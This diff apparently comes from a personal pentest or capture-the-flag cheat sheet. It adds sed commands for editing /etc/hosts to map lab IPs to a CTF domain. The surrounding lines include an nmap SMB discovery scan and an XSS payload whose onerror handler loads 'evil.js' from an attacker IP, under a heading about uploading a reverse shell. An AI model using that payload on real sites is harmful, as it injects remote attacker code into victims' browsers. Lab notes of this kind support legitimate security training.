@@ -4,6 +4,14 @@ cat a.txt, less a.txt      #cat and less to read files
 Identify FQDN of the Domain Controller
 #nmap --script=smb-os-discovery.nse 10.10.1.22
 
+sed command
+------------
+#sed -i '$ s/replaced_object/replacing_object/' /etc/hosts (s means substitue)
+#sed '$!d' (or) tail -n 1 ($!d = last line)
+#sudo sed -i -e '$a\10.10.173.97 vulnnet-rst.local' /etc/hosts (a means append)
+#sudo sed -i "$ s/$(sudo sed '$!d' /etc/hosts)/10.10.33.231 vulnnet-rst.local/" /etc/hosts ($ is also last line)
+#sudo sed -i "$ s/$(sudo sed '$!d' /etc/hosts)/$ip $(sudo sed '$!d' /etc/hosts | awk '{print $2}')/" /etc/hosts
+
 Upload reverse shell script file in web-server But must upload with PHP server
 ------------------------------------------------------------------------------
 <img SRC=c onerror="var script1 = document.createElement('script');script1.src = 'http://10.10.16.25:8090/evil.js';document.head.appendChild(script1);"/>
